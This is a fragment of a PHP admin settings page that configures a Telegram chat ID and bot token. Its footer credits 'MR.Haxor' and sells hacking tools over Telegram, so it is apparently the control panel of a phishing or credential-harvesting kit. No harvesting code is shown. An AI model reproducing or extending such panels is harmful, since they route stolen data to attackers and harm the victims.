...
*/
    ...
    $settings = parse_ini_file("./jobs/presh.php");
    ...
    <body>
        ...
        <div class="container mt-4">
                        ...
                        <div class="card-body">
                            ...
                            <form class="m-0" action="./jobs/settings.php" method="POST">
                                ...
                                <div class="mt-3">
                                    ...
                                    <input type="text" class="form-control" placeholder="Chat Id" name="chatid" <?php if (isset($settings['chat_id'])) { echo 'value="' . $settings['chat_id'] . '"' ; } ?>>
                                </div>
                                <div class="mt-3">
                                    <label>telegram token</label>
                                    <input type="text" class="form-control" placeholder="token to access" name="token" <?php if (isset($settings['bot_url'])) { echo 'value="' . $settings['bot_url'] . '"' ; } ?>>
                                </div>
                                <div class="row">
                                    <div class="col-12">
                                        <label class="ckbox d-flex align-items-center m-0 mt-4">
                                            <input type="checkbox" name="telegrams" <?php if (isset($settings['telegram']) && $settings['telegram'] == "on") { echo 'checked' ; } ?>><span>Enable Telegram</span>
                                        </label>
                                    </div>
                                </div>
                                   <div class="row">
            ...
            <div class="text-center my-5">
                <span class="small">
                    <span>Code written by MR.Haxor, not for redistribution.</span>
                    <br>
                    <span>Contact TeleGRAM if you want to buy tools and services or free support @H4x0rxploit</span>
                    <br>
                    <span>Sincerely, <a class="text-danger" href="https://t.me/H4x0rxploits" target="_blank">P</a></span>
                </span>
            </div>
        </div>
